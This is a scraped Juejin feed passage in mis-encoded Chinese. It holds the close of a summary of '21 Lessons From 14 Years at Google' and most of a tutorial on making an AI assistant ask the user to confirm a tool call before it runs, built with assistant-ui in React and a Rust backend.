<p>å†™ä½œâ€”â€”ä¸æ˜¯ä¸ºäº†å¸å¼•çœ¼çƒï¼Œè€Œæ˜¯ä¸ºäº†æ¸…æ™°è¡¨è¾¾ã€‚æ„å»ºå¯å¤ç”¨çš„åŸºç¡€æ¨¡å‹ã€‚å°†è¿‡å¾€çš„ç»éªŒæ€»ç»“æˆè¡ŒåŠ¨æŒ‡å—ã€‚</p>
<p>æ‰€ä»¥å¦‚æœå·¥ç¨‹å¸ˆæŠŠèŒä¸šç”Ÿæ¶¯çœ‹ä½œæ˜¯å¤åˆ©æŠ•èµ„ï¼Œè€Œä¸æ˜¯å½©ç¥¨ï¼Œé‚£ä¹ˆä»–æœ€ç»ˆå¾€å¾€ä¼šå–å¾—æ›´å¤§çš„æˆå°±ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cbc39fec74084b4bb1da61680519ae77~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=vFRMo2b8XJ0ERXUcS1jhPGpj35s%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-21">22. æœ€å</h2>
<p>21 æ¡å¬èµ·æ¥å¾ˆå¤šï¼Œä½†å®ƒä»¬å¯ä»¥å½’ç»“ä¸ºå‡ ä¸ªæ ¸å¿ƒç‚¹ï¼š<strong>ä¿æŒå¥½å¥‡ï¼Œä¿æŒè°¦é€Šï¼Œè®°ä½å·¥ä½œå§‹ç»ˆæ˜¯å…³äºäººçš„â€”â€”ä½ çš„ç”¨æˆ·ã€ä½ çš„é˜Ÿå‹ã€‚</strong></p>
<p>å·¥ç¨‹å¸ˆçš„èŒä¸šç”Ÿæ¶¯è¶³å¤Ÿé•¿ï¼Œå¯ä»¥çŠ¯å¾ˆå¤šé”™è¯¯ã€‚æˆ‘æœ€é’¦ä½©çš„å·¥ç¨‹å¸ˆï¼Œä¸æ˜¯é‚£äº›ä»€ä¹ˆéƒ½åšå¯¹çš„äººâ€”â€”è€Œæ˜¯é‚£äº›ä»é”™è¯¯ä¸­å­¦ä¹ ã€åˆ†äº«å‘ç°ã€å¹¶åšæŒä¸æ‡ˆçš„äººã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7dabdf347a89449c82168d8b3874ea8e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=lOdCh9VYpkiMRREZKOHV7T%2FIGmE%3D" alt="" loading="lazy"/></p>
<p>æœ¬ç¯‡æ•´ç†è‡ª<a href="https://link.juejin.cn?target=https%3A%2F%2Faddyosmani.com%2Fblog%2F21-lessons%2F%3Fref%3Ddailydev" target="_blank" title="https://addyosmani.com/blog/21-lessons/?ref=dailydev" ref="nofollow noopener noreferrer">ã€Š21 Lessons From 14 Years at Googleã€‹</a>ï¼Œå¸Œæœ›èƒ½å¸®åŠ©åˆ°ä½ ã€‚</p>
<p>æˆ‘æ˜¯å†´ç¾½ï¼Œ10 å¹´ç¬”è€•ä¸è¾ï¼Œä¸“æ³¨å‰ç«¯é¢†åŸŸï¼Œæ›´æ–°äº† 10+ ç³»åˆ—ã€300+ ç¯‡åŸåˆ›æŠ€æœ¯æ–‡ç« ï¼Œç¿»è¯‘è¿‡ Svelteã€Solid.jsã€TypeScript æ–‡æ¡£ï¼Œè‘—æœ‰å°å†Œã€ŠNext.js å¼€å‘æŒ‡å—ã€‹ã€ã€ŠSvelte å¼€å‘æŒ‡å—ã€‹ã€ã€ŠAstro å®æˆ˜æŒ‡å—ã€‹ã€‚</p>
<p>æ¬¢è¿å›´è§‚æˆ‘çš„â€œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fyayujs.com%2F" target="_blank" title="https://yayujs.com/" ref="nofollow noopener noreferrer">ç½‘é¡µç‰ˆæœ‹å‹åœˆ</a>â€ï¼Œå…³æ³¨æˆ‘çš„å…¬ä¼—å·ï¼š<strong>å†´ç¾½ï¼ˆæˆ–æœç´¢ yayujsï¼‰</strong>ï¼Œæ¯å¤©åˆ†äº«å‰ç«¯çŸ¥è¯†ã€AI å¹²è´§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è®© AI å­¦ä¼š"é—®ä¸€å˜´"ï¼šassistant-ui å‰ç«¯å·¥å…·çš„äººæœºäº¤äº’å®è·µ]]></title>    <link>https://juejin.cn/post/7597276695403626537</link>    <guid>https://juejin.cn/post/7597276695403626537</guid>    <pubDate>2026-01-20T14:02:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597276695403626537" data-draft-id="7597253913248841769" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è®© AI å­¦ä¼š&quot;é—®ä¸€å˜´&quot;ï¼šassistant-ui å‰ç«¯å·¥å…·çš„äººæœºäº¤äº’å®è·µ"/> <meta itemprop="keywords" content="å‰ç«¯,Rust,OpenAI"/> <meta itemprop="datePublished" content="2026-01-20T14:02:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çº¢å°˜æ•£ä»™"/> <meta itemprop="url" content="https://juejin.cn/user/334694205359901"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è®© AI å­¦ä¼š"é—®ä¸€å˜´"ï¼šassistant-ui å‰ç«¯å·¥å…·çš„äººæœºäº¤äº’å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/334694205359901/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çº¢å°˜æ•£ä»™
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:02:05.000Z" title="Tue Jan 20 2026 14:02:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    32
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">è®© AI å­¦ä¼š"é—®ä¸€å˜´"ï¼šassistant-ui å‰ç«¯å·¥å…·çš„äººæœºäº¤äº’å®è·µ</h2>
<blockquote>
<p>ğŸ¤– å½“ AI åŠ©æ‰‹è¦å¸®ç”¨æˆ·æ‰§è¡Œæ•æ„Ÿæ“ä½œæ—¶ï¼Œæ€»ä¸èƒ½é—·å¤´å°±å¹²å§ï¼Ÿå¾—å…ˆé—®é—®äººå®¶ç¡®ä¸ç¡®è®¤å•Šï¼</p>
</blockquote>
<h3 data-id="heading-1">èƒŒæ™¯ï¼šä¸€ä¸ª"è½æ’"çš„ AI åŠ©æ‰‹</h3>
<p>æˆ‘åœ¨åšä¸€ä¸ªå·¥å•ç®¡ç†ç³»ç»Ÿï¼Œé‡Œé¢æœ‰ä¸ª AI åŠ©æ‰‹åŠŸèƒ½ã€‚ç”¨æˆ·å¯ä»¥è¯´"å¸®æˆ‘åˆ›å»ºä¸€ä¸ªå·¥å•ï¼Œæ•°é‡ 50"ï¼ŒAI å°±ä¼šè°ƒç”¨å·¥å…·åˆ›å»ºè®°å½•ã€‚</p>
<p>å¬èµ·æ¥å¾ˆç¾å¥½ï¼Œä½†é—®é¢˜æ¥äº†ï¼š</p>
<p><strong>AI å¤ª"è‡ªä¿¡"äº†ã€‚</strong></p>
<p>å®ƒæ”¶åˆ°æŒ‡ä»¤å°±ç›´æ¥æ‰§è¡Œï¼Œä¸‡ä¸€ç”¨æˆ·è¯´é”™äº†å‘¢ï¼Ÿä¸‡ä¸€ AI ç†è§£é”™äº†å‘¢ï¼Ÿ50 å˜æˆ 500ï¼Œé‚£å¯å°±éº»çƒ¦äº†ã€‚</p>
<p>æ‰€ä»¥æˆ‘éœ€è¦ä¸€ä¸ªæœºåˆ¶ï¼š<strong>AI è°ƒç”¨å·¥å…·å‰ï¼Œå…ˆè®©ç”¨æˆ·ç¡®è®¤ä¸€ä¸‹ã€‚</strong></p>
<pre><code class="hljs language-less" lang="less">ç”¨æˆ·: å¸®æˆ‘åˆ›å»ºä¸€ä¸ªå·¥å•ï¼Œæ•°é‡ <span class="hljs-number">50</span>

<span class="hljs-selector-tag">AI</span>: å¥½çš„ï¼Œæˆ‘æ¥å¸®ä½ åˆ›å»ºè®°å½•
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ ç¡®è®¤åˆ›å»ºè®°å½•             â”‚
    â”‚ åç§°: <span class="hljs-selector-tag">A</span> æ¬¾               â”‚
    â”‚ æ•°é‡: <span class="hljs-number">50</span>                 â”‚
    â”‚ <span class="hljs-selector-attr">[ç¡®è®¤]</span>  <span class="hljs-selector-attr">[å–æ¶ˆ]</span>           â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

ç”¨æˆ·: *ç‚¹å‡»ç¡®è®¤*

<span class="hljs-selector-tag">AI</span>: âœ… å·²åˆ›å»ºè®°å½•ï¼š<span class="hljs-selector-tag">A</span> æ¬¾ <span class="hljs-selector-tag">x</span> <span class="hljs-number">50</span>
</code></pre>
<p>è¿™å°±æ˜¯æ‰€è°“çš„ <strong>Human-in-the-Loop</strong>ï¼ˆäººæœºåä½œï¼‰æ¨¡å¼ã€‚</p>
<h3 data-id="heading-2">æŠ€æœ¯é€‰å‹</h3>
<ul>
<li>å‰ç«¯ï¼šReact + <code>@assistant-ui/react</code></li>
<li>åç«¯ï¼šRust + Axum + Rigï¼ˆAI æ¡†æ¶ï¼‰</li>
<li>AIï¼šOpenAI GPT-4</li>
</ul>
<p><code>assistant-ui</code> æ˜¯ä¸€ä¸ªä¸“é—¨ä¸º AI èŠå¤©ç•Œé¢è®¾è®¡çš„ React ç»„ä»¶åº“ï¼Œå®ƒæœ‰ä¸ªå¾ˆæ£’çš„ç‰¹æ€§ï¼š<strong>å‰ç«¯å·¥å…·ï¼ˆFrontend Toolsï¼‰</strong>ã€‚</p>
<h3 data-id="heading-3">æ¶æ„æ¦‚è§ˆ</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph Frontend["å‰ç«¯ (React)"]
        Runtime[useChatRuntime]
        Tool[CreateRecordTool&lt;br/&gt;å‰ç«¯å·¥å…·]
        UI[ç¡®è®¤ UI]
        Runtime --&gt; Tool --&gt; UI
        UI --&gt;|resume| Tool
        Tool --&gt;|sendAutomatically| Runtime
    end

    subgraph Backend["åç«¯ (Rust)"]
        Handler[Chat Handler]
        FTool[FrontendTool&lt;br/&gt;å·¥å…·å®šä¹‰è½¬å‘]
        AI[AI Model]
        Handler --&gt; FTool --&gt; AI
    end

    Runtime &lt;--&gt;|HTTP| Handler
</code></pre>
<h3 data-id="heading-4">æ ¸å¿ƒæ¦‚å¿µï¼šå‰ç«¯å·¥å…· vs åç«¯å·¥å…·</h3>

























<table><thead><tr><th/><th>å‰ç«¯å·¥å…·</th><th>åç«¯å·¥å…·</th></tr></thead><tbody><tr><td>æ‰§è¡Œä½ç½®</td><td>æµè§ˆå™¨</td><td>æœåŠ¡å™¨</td></tr><tr><td>èƒ½å¦ä¸ç”¨æˆ·äº¤äº’</td><td>âœ… å¯ä»¥</td><td>âŒ ä¸è¡Œ</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>éœ€è¦ç¡®è®¤çš„æ“ä½œ</td><td>æŸ¥è¯¢ã€è®¡ç®—</td></tr></tbody></table>
<p>å‰ç«¯å·¥å…·çš„ç²¾é«“åœ¨äºï¼š<strong>å·¥å…·å®šä¹‰å‘ç»™ AIï¼Œä½†æ‰§è¡Œåœ¨å‰ç«¯</strong>ã€‚</p>
<p>AI çŸ¥é“æœ‰è¿™ä¸ªå·¥å…·å¯ä»¥ç”¨ï¼Œå½“å®ƒå†³å®šè°ƒç”¨æ—¶ï¼Œå‰ç«¯æ‹¦æˆªæ‰§è¡Œï¼Œå¯ä»¥å¼¹ä¸ªç¡®è®¤æ¡†ã€è®©ç”¨æˆ·å¡«ä¸ªè¡¨å•ï¼Œç”¨æˆ·æ“ä½œå®Œå†æŠŠç»“æœå‘Šè¯‰ AIã€‚</p>
<h3 data-id="heading-5">å®ç°æ­¥éª¤</h3>
<h4 data-id="heading-6">1. å®šä¹‰å·¥å…·å‚æ•°</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// schema.ts</span>
<span class="hljs-keyword">import</span> { z } <span class="hljs-keyword">from</span> <span class="hljs-string">"zod"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">CreateRecordSchema</span> = z.<span class="hljs-title function_">object</span>({
  <span class="hljs-attr">name</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">describe</span>(<span class="hljs-string">"åç§°"</span>),
  <span class="hljs-attr">amount</span>: z.<span class="hljs-title function_">number</span>().<span class="hljs-title function_">describe</span>(<span class="hljs-string">"æ•°é‡"</span>),
});
</code></pre>
<h4 data-id="heading-7">2. åˆ›å»ºå‰ç«¯å·¥å…·</h4>
<p>è¿™æ˜¯æœ€å…³é”®çš„éƒ¨åˆ†ï¼Œä½¿ç”¨ <code>makeAssistantTool</code>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { makeAssistantTool } <span class="hljs-keyword">from</span> <span class="hljs-string">"@assistant-ui/react"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">CreateRecordTool</span> = <span class="hljs-title function_">makeAssistantTool</span>({
  <span class="hljs-attr">toolName</span>: <span class="hljs-string">"create-record"</span>,
  <span class="hljs-attr">type</span>: <span class="hljs-string">"frontend"</span>,  <span class="hljs-comment">// ğŸ”‘ å…³é”®ï¼šæ ‡è®°ä¸ºå‰ç«¯å·¥å…·</span>
  <span class="hljs-attr">parameters</span>: <span class="hljs-title class_">CreateRecordSchema</span>,
  <span class="hljs-attr">description</span>: <span class="hljs-string">"åˆ›å»ºè®°å½•"</span>,

  <span class="hljs-comment">// execute åœ¨å‰ç«¯æ‰§è¡Œ</span>
  <span class="hljs-attr">execute</span>: <span class="hljs-keyword">async</span> (args, ctx) =&gt; {
    <span class="hljs-keyword">const</span> { human } = ctx;

    <span class="hljs-comment">// human() ä¼šæš‚åœæ‰§è¡Œï¼Œç­‰å¾…ç”¨æˆ·ç¡®è®¤</span>
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">human</span>(<span class="hljs-string">"è¯·ç¡®è®¤åˆ›å»ºè®°å½•"</span>);

    <span class="hljs-keyword">if</span> (response === <span class="hljs-string">"confirmed"</span>) {
      <span class="hljs-comment">// è°ƒç”¨å®é™… API</span>
      <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">createRecord</span>(args);
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> };
    }
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span> };
  },

  <span class="hljs-comment">// render æ¸²æŸ“ç¡®è®¤ UI</span>
  <span class="hljs-attr">render</span>: <span class="hljs-function">(<span class="hljs-params">{ args, status, result, resume }</span>) =&gt;</span> {
    <span class="hljs-comment">// ç­‰å¾…ç¡®è®¤çŠ¶æ€</span>
    <span class="hljs-keyword">if</span> (status.<span class="hljs-property">type</span> === <span class="hljs-string">"requires-action"</span>) {
      <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"rounded-lg border p-4"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>ç¡®è®¤åˆ›å»ºè®°å½•<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>åç§°: {args.name} | æ•°é‡: {args.amount}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> resume("confirmed")}&gt;ç¡®è®¤<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> resume("cancelled")}&gt;å–æ¶ˆ<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
      );
    }

    <span class="hljs-comment">// å®ŒæˆçŠ¶æ€</span>
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{result?.success ? "âœ…" : "âŒ"} å·²å¤„ç†<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
  },
});
</code></pre>
<p><strong>æ ¸å¿ƒ API è§£é‡Šï¼š</strong></p>
<ul>
<li><code>human(message)</code>: æš‚åœæ‰§è¡Œï¼Œç­‰å¾…ç”¨æˆ·æ“ä½œ</li>
<li><code>resume(value)</code>: ç”¨æˆ·æ“ä½œåæ¢å¤æ‰§è¡Œï¼Œvalue ä¼šä½œä¸º <code>human()</code> çš„è¿”å›å€¼</li>
</ul>
<h4 data-id="heading-8">3. æ³¨å†Œå·¥å…·</h4>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ChatPage</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> processedToolCalls = <span class="hljs-title function_">useRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>&lt;<span class="hljs-built_in">string</span>&gt;());

  <span class="hljs-keyword">const</span> runtime = <span class="hljs-title function_">useChatRuntime</span>({
    <span class="hljs-attr">transport</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssistantChatTransport</span>({
      <span class="hljs-attr">api</span>: <span class="hljs-string">"/api/chat"</span>,
    }),
    <span class="hljs-comment">// å·¥å…·å®Œæˆåè‡ªåŠ¨å‘é€ç»“æœç»™åç«¯</span>
    <span class="hljs-attr">sendAutomaticallyWhen</span>: <span class="hljs-function">(<span class="hljs-params">options</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">lastAssistantMessageIsCompleteWithToolCalls</span>(options)) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
      }
      <span class="hljs-keyword">const</span> lastMsg = options.<span class="hljs-property">messages</span>.<span class="hljs-title function_">at</span>(-<span class="hljs-number">1</span>);
      <span class="hljs-keyword">const</span> toolPart = lastMsg?.<span class="hljs-property">parts</span>.<span class="hljs-title function_">find</span>(
        <span class="hljs-function">(<span class="hljs-params">p</span>) =&gt;</span> p.<span class="hljs-property">type</span> === <span class="hljs-string">"tool-create-record"</span> &amp;&amp; p.<span class="hljs-property">state</span> === <span class="hljs-string">"output-available"</span>
      ) <span class="hljs-keyword">as</span> { <span class="hljs-attr">toolCallId</span>: <span class="hljs-built_in">string</span> } | <span class="hljs-literal">undefined</span>;

      <span class="hljs-keyword">if</span> (toolPart &amp;&amp; !processedToolCalls.<span class="hljs-property">current</span>.<span class="hljs-title function_">has</span>(toolPart.<span class="hljs-property">toolCallId</span>)) {
        processedToolCalls.<span class="hljs-property">current</span>.<span class="hljs-title function_">add</span>(toolPart.<span class="hljs-property">toolCallId</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
      }
      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    },
  });

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">AssistantRuntimeProvider</span> <span class="hljs-attr">runtime</span>=<span class="hljs-string">{runtime}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Thread</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">CreateRecordTool</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">AssistantRuntimeProvider</span>&gt;</span></span>
  );
}
</code></pre>
<h4 data-id="heading-9">4. åç«¯æ¥æ”¶å·¥å…·å®šä¹‰</h4>
<p>å‰ç«¯ä¼šæŠŠå·¥å…·å®šä¹‰å‘ç»™åç«¯ï¼Œåç«¯éœ€è¦è½¬å‘ç»™ AIï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// Rust åç«¯</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">FrontendTool</span> {
    <span class="hljs-keyword">pub</span> name: <span class="hljs-type">String</span>,
    <span class="hljs-keyword">pub</span> description: <span class="hljs-type">String</span>,
    <span class="hljs-keyword">pub</span> parameters: Value,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">ToolDyn</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">FrontendTool</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">name</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span> { <span class="hljs-keyword">self</span>.name.<span class="hljs-title function_ invoke__">clone</span>() }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">definition</span>(&amp;<span class="hljs-keyword">self</span>, _: <span class="hljs-type">String</span>) <span class="hljs-punctuation">-&gt;</span> ToolDefinition {
        ToolDefinition {
            name: <span class="hljs-keyword">self</span>.name.<span class="hljs-title function_ invoke__">clone</span>(),
            description: <span class="hljs-keyword">self</span>.description.<span class="hljs-title function_ invoke__">clone</span>(),
            parameters: <span class="hljs-keyword">self</span>.parameters.<span class="hljs-title function_ invoke__">clone</span>(),
        }
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">call</span>(&amp;<span class="hljs-keyword">self</span>, _: <span class="hljs-type">String</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;<span class="hljs-type">String</span>, ToolError&gt; {
        <span class="hljs-comment">// å‰ç«¯å·¥å…·ä¸åœ¨åç«¯æ‰§è¡Œï¼</span>
        <span class="hljs-title function_ invoke__">Err</span>(ToolError::<span class="hljs-title function_ invoke__">ToolCallError</span>(<span class="hljs-string">"Frontend tool"</span>.<span class="hljs-title function_ invoke__">into</span>()))
    }
}
</code></pre>
<h3 data-id="heading-10">å®Œæ•´æµç¨‹</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant ç”¨æˆ·
    participant å‰ç«¯
    participant åç«¯
    participant AI

    ç”¨æˆ·-&gt;&gt;å‰ç«¯: "åˆ›å»ºå·¥å•ï¼Œæ•°é‡ 50"
    å‰ç«¯-&gt;&gt;åç«¯: å‘é€æ¶ˆæ¯ + å·¥å…·å®šä¹‰
    åç«¯-&gt;&gt;AI: è½¬å‘
    AI-&gt;&gt;åç«¯: è°ƒç”¨ create-record
    åç«¯--&gt;&gt;å‰ç«¯: è¿”å›å·¥å…·è°ƒç”¨
    å‰ç«¯-&gt;&gt;å‰ç«¯: execute() â†’ human()
    å‰ç«¯-&gt;&gt;ç”¨æˆ·: æ˜¾ç¤ºç¡®è®¤æ¡†
    ç”¨æˆ·-&gt;&gt;å‰ç«¯: ç‚¹å‡»ç¡®è®¤
